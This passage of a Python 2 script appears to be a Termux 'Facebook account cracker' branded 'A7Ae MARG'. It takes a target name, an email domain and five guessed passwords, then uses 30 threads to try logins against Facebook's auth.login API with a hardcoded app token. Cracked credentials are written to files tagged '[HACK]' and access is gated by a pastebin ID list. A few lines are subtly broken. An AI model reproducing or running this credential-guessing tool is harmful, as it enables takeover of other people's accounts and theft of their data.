    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass1
                okb = open('save/nguyen.txt', 'a')
                okb.write('[HACK] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass1
                cps = open('save/nguyen.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass2
                    okb = open('save/nguyen.txt', 'a')
                    okb.write('[HACK] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass2
                    cps = open('save/nguyen.txt', 'a')
                    cps.write('[CHECK] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass3
                        okb = open('save/nguyen.txt', 'a')
                        okb.write('[HACK] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass3
                        cps = open('save/nguyen.txt', 'a')
                        cps.write('[CHECK]' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass4
                            okb = open('save/nguyen.txt', 'a')
                            okb.write('[HACK]' + k + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass4
                            cps = open('save/nguyen.txt', 'a')
                            cps.write('[CHECK' + k + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass5
                                okb = open('save/nguyen.txt', 'a')
                                okb.write('[HACK]' + k + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass5
                                cps = open('save/nguyen.txt', 'a')
                                cps.write('[CHECK]' + k + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done ....'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;97mOK\x1b[1;97m/\x1b[1;97mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/kurd3.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;97m BACK \x1b[1;97m]')
    os.system('python2 MARG.py')


def crack_email():
    os.system('clear')
    print logo
    try:
        print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example\x1b[1;97m :\x1b[1;97m putri.ayu '
        c = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Nama Target\x1b[1;97m :\x1b[1;97m ')
        print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example \x1b[1;97m: \x1b[1;97m@hotmail.com'
        k = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Domain Email\x1b[1;97m :\x1b[1;97m ')
        print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example \x1b[1;97m: \x1b[1;97mPutri123'
        pass1 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password1\x1b[1;97m :\x1b[1;97m ')
        pass2 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password2\x1b[1;97m :\x1b[1;97m ')
        pass3 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password3\x1b[1;97m :\x1b[1;97m ')
        pass4 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password4\x1b[1;97m :\x1b[1;97m ')
        pass5 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password5\x1b[1;97m :\x1b[1;97m ')
        idlist = '..txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))    
    jalan('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Email \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(1)
    jalan("\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mDon't Close")
    time.sleep(1)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass1
                okb = open('save/email.txt', 'a')
                okb.write('[Berhasil] ' + c + user + k + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + ' \x1b[1;97m ' + pass1
                cps = open('save/email.txt', 'a')
                cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass2
                    okb = open('save/email.txt', 'a')
                    okb.write('[Berhasil] ' + c + user + k + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + ' \x1b[1;97m ' + pass2
                    cps = open('save/email.txt', 'a')
                    cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass3
                        okb = open('save/email.txt', 'a')
                        okb.write('[Berhasil] ' + c + user + k + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + '\x1b[1;97m ' + pass3
                        cps = open('save/email.txt', 'a')
                        cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass4
                            okb = open('save/email.txt', 'a')
                            okb.write('[Berhasil] ' + c + user + k + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + ' \x1b[1;97m ' + pass4
                            cps = open('save/email.txt', 'a')
                            cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass5
                                okb = open('save/email.txt', 'a')
                                okb.write('[Berhasil]' + c + user + k + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + ' \x1b[1;97m ' + pass5
                                cps.open('save/email.txt', 'a')
                                cps.write('[Cekpoint]' + c + user + k + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done ....'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;97mOK\x1b[1;97m/\x1b[1;97mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/email.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;97m BACK \x1b[1;97m]')
    os.system('python2 MARG.py')

def idcr():
    uuid = requests.get('https://httpbin.org/uuid')
    jsonid = json.loads(uuid.text)
    idjscr = jsonid['uuid']
    os.system('touch /data/data/com.termux/beta.txt')
    reb = open('/data/data/com.termux/beta.txt', 'w')
    reb.write(idjscr)
    reb.close()
    chk()


def chk():
    x = os.listdir('/data/data/com.termux/')
    if 'beta.txt' in x:
        os.system('chmod 777 /data/data/com.termux/beta.txt')
        readid = open('/data/data/com.termux/beta.txt', 'r').read()
        print 'Your ID : ' + str(readid)
        textupload = requests.get('https://pastebin.com/raw/FWb1V8GH').text
        if readid in textupload:
            print "\x1b[1;92mYour ID is Active  .... "
            time.sleep(5)
            os.system('chmod 000 /data/data/com.termux/beta.txt')
            menu()
        else:
            os.system('chmod 000 /data/data/com.termux/beta.txt')
            print "\x1b[31;1mYour ID Isn't Active ....."
            time.sleep(5)
            sys.exit()
    else:
        idcr()


if __name__ == '__main__':
    os.system('clear')
    print logo
    time.sleep(2)
    chk()
